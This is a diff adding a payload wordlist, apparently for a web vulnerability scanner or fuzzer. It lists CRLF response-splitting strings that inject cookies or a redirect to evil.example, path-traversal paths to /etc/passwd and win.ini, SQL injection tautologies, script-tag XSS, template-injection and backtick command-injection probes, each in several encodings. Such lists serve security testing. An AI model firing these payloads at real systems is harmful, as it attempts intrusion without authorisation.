@@ -1,0 +1,80 @@
+%0d%0aSet-Cookie:%20injected=1
+%0d%0aLocation:%20https://evil.example
+%0d%0aX-Test:%20injected
+Set-Cookie: injected=1
+%0aX-Injected:%201
+test
+baseline
+AUROSE_PROBE
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+<script>alert(1)</script>
+${7*7}
+{{7*7}}
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%250d%250aSet-Cookie%3A%2520injected%3D1
+%250d%250aLocation%3A%2520https%3A%2F%2Fevil.example
+%250d%250aX-Test%3A%2520injected
+%0D%0ASet-Cookie%3A%20injected%3D1
+%250aX-Injected%3A%25201
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%24%7B7%2A7%7D
+%7B%7B7%2A7%7D%7D
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+%0D%0ASET-COOKIE:%20INJECTED=1
+%0D%0ALOCATION:%20HTTPS://EVIL.EXAMPLE
+%0D%0AX-TEST:%20INJECTED
+SET-COOKIE: INJECTED=1
+%0AX-INJECTED:%201
+TEST
+BASELINE
+../../../../ETC/PASSWD
+..\..\..\..\WINDOWS\WIN.INI
+<SCRIPT>ALERT(1)</SCRIPT>
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+%250D%250ASET-COOKIE%3A%2520INJECTED%3D1
+%250D%250ALOCATION%3A%2520HTTPS%3A%2F%2FEVIL.EXAMPLE
+%250D%250AX-TEST%3A%2520INJECTED
+%0D%0ASET-COOKIE%3A%20INJECTED%3D1
+%250AX-INJECTED%3A%25201
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+%0d%0aSet-Cookie:%20injected%3D1
+Set-Cookie: injected%3D1
+' OR '1'%3D'1
+" OR "1"%3D"1
+%0D%0ASET-COOKIE:%20INJECTED%3D1
+SET-COOKIE: INJECTED%3D1
+%0d%0aSet-Cookie:%20injected=1?v=0
+%0d%0aSet-Cookie:%20injected=1&v=0
+%250d%250aSet-Cookie%3A%2520injected%3D1_0
+responsesplit_0
+/responsesplit/0
+%0d%0aSet-Cookie:%20injected=1%0a0
+%0d%0aLocation:%20https://evil.example?v=1
+%0d%0aLocation:%20https://evil.example&v=1
+%250d%250aLocation%3A%2520https%3A%2F%2Fevil.example_1
+responsesplit_1
+/responsesplit/1
+%0d%0aLocation:%20https://evil.example%0a1
+%0d%0aX-Test:%20injected?v=2
+%0d%0aX-Test:%20injected&v=2
+%250d%250aX-Test%3A%2520injected_2
+responsesplit_2
